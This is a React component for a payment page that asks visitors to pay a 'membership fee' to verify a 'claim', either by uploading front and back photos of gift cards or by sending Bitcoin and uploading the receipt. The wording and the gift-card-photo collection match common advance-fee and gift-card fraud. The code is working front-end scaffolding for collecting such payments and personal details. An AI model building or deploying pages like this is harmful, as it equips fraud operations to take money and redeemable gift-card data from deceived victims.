import React, { useState } from "react";
import HeroHeader from "../components/HeroHeader";

export default function Payment() {
  const [status, setStatus] = useState(null);

  const bitcoinAddress = "bc1xxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

  const copyBitcoin = () => {
    navigator.clipboard.writeText(bitcoinAddress);
    alert("Bitcoin address copied.");
  };

  const handleUploadSubmit = async (e) => {
    e.preventDefault();

    const formData = new FormData();
    formData.append("type", "verification");
    formData.append("name", e.target.name.value);
    formData.append("email", e.target.email.value);
    formData.append("frontImage", e.target.frontImage.files[0]);
    formData.append("backImage", e.target.backImage.files[0]);

    try {
      const res = await fetch("/api/payment", {
        method: "POST",
        body: formData,
      });

      const data = await res.json();

      if (data.success) {
        setStatus("success");
        e.target.reset();
      } else {
        setStatus("error");
      }
    } catch {
      setStatus("error");
    }
  };

  const handleBitcoinSubmit = async (e) => {
    e.preventDefault();

    const formData = new FormData();
    formData.append("type", "bitcoin");
    formData.append("name", e.target.name.value);
    formData.append("email", e.target.email.value);
    formData.append("receipt", e.target.receipt.files[0]);

    try {
      const res = await fetch("/api/payment", {
        method: "POST",
        body: formData,
      });

      const data = await res.json();

      if (data.success) {
        setStatus("success");
        e.target.reset();
      } else {
        setStatus("error");
      }
    } catch {
      setStatus("error");
    }
  };

  return (
    <div>
      <HeroHeader />

      <div className="payment-page">
        <h1 className="payment-title">
          Payment & Membership Payment Submission
        </h1>

        <p className="payment-text">
          Complete your claim verification by paying the required membership fee
          via Gift Card or Bitcoin. After payment, please upload your Gift Card
          information or Bitcoin transaction receipt as proof of payment. Our
          verification team will review your submission and process your claim
          accordingly.
        </p>

        {/* CARD 1 */}

        <div className="payment-card">
          <h2>Upload Front & Back Giftcard</h2>

          <form onSubmit={handleUploadSubmit}>
            <input type="text" name="name" placeholder="Full Name" required />

            <input
              type="email"
              name="email"
              placeholder="Email Address"
              required
            />

            <label>Front Image</label>
            <input type="file" name="frontImage" accept="image/*" required />

            <label>Back Image</label>
            <input type="file" name="backImage" accept="image/*" required />

            <button type="submit">Submit Verification</button>
          </form>
        </div>

        {/* CARD 2 */}

        <div className="payment-card">
          <h2>Bitcoin Payment</h2>

          <p className="btc-address">{bitcoinAddress}</p>

          <button type="button" className="copy-btn" onClick={copyBitcoin}>
            Copy Bitcoin Address
          </button>

          <form onSubmit={handleBitcoinSubmit}>
            <input type="text" name="name" placeholder="Full Name" required />

            <input
              type="email"
              name="email"
              placeholder="Email Address"
              required
            />

            <label>Upload Payment Receipt</label>
            <input type="file" name="receipt" accept="image/*,.pdf" required />

            <button type="submit">Submit Receipt</button>
          </form>
        </div>

        {status === "success" && (
          <div className="success-box">Submission received successfully.</div>
        )}

        {status === "error" && (
          <div className="error-box">
            Something went wrong. Please try again.
          </div>
        )}
      </div>
    </div>
  );
}
